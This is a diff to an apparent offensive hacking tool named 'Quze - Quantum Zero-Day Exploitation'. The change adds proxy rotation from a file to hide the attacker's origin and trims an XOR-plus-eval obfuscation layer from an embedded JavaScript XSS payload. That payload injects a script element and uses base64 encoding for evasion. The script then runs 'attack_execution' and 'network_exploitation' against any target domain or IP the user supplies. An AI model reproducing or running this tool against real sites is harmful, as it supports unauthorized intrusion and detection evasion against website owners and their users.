@@ -890,6 +890,7 @@ def attack_execution(target, payload, proxy_file=None):
 def main():
     parser = argparse.ArgumentParser(description="Quze - Quantum Zero-Day Exploitation")
     parser.add_argument("-t", "--target", help="Target domain/IP", required=True)
+    parser.add_argument("-f", "--file", help="File proxy opsional")
     args = parser.parse_args()
     
     target = args.target.strip()
@@ -900,6 +901,15 @@ def main():
     print(f"[*] Running Quze attack on {target}...")
     
     Quantum_AI()
+    
+    proxy = None
+    if args.file:
+        proxies = load_proxies(args.file)
+        if proxies:
+            proxy = random.choice(proxies)
+            proxy = {"http": proxy, "https": proxy}
+            print(f"[*] Using proxy: {proxy}")
+    
     payload = """
     // Step 1: Encode and decode payload for evasion (Base64 Obfuscation)
     var b64 = "Y29uc29sZS5sb2coIkxhb2RhIFhTUyIpOw==";  // Base64 encoded script: console.log("Load XSS")
@@ -916,24 +926,8 @@ def main():
     var injectScript = document.createElement("script");
     injectScript.innerHTML = 'alert("Quze XSS Executed!");';  // This could be any other JS command based on your needs
     document.body.appendChild(injectScript);  // Dynamically execute XSS payload
-
-    // Optional: Encryption layer using a simple key for payload (for added obfuscation)
-    var key = "QuantumKey123";  // A key for encryption (could be used with more complex encryption algorithms)
-    function encrypt(data, key) {
-        // Simple XOR encryption (just for example purposes)
-        var result = '';
-        for (var i = 0; i < data.length; i++) {
-            result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-        }
-        return result;
-    }
-
-    var encryptedPayload = encrypt("alert('This is a hidden alert after encryption.');", key);  // Encrypting the payload
-    var decryptedPayload = encrypt(encryptedPayload, key);  // Decrypting back (this step can be done dynamically)
-    eval(decryptedPayload);  // Execute the decrypted payload after encryption/decryption cycle
-
-})();
-</script>"""
+    """
+    
     key = base64.b64decode("UXVhbnR1bTEyMw==").decode()
     
     model = load_ml_model()
@@ -941,7 +935,6 @@ def main():
         payload = ai_payload_mutation_v2(model, payload)
     
     setup_vpn()
-    setup_proxy()
     
     quantum_data_integrity_check(payload)
     network_exploitation(target, payload)
@@ -967,6 +960,6 @@ def main():
     attack_execution(target, evasive_payload)
     
     print("[+] All attacks have been executed. Cleaning up and closing connections...")
-    
+
 if __name__ == "__main__":
     main()
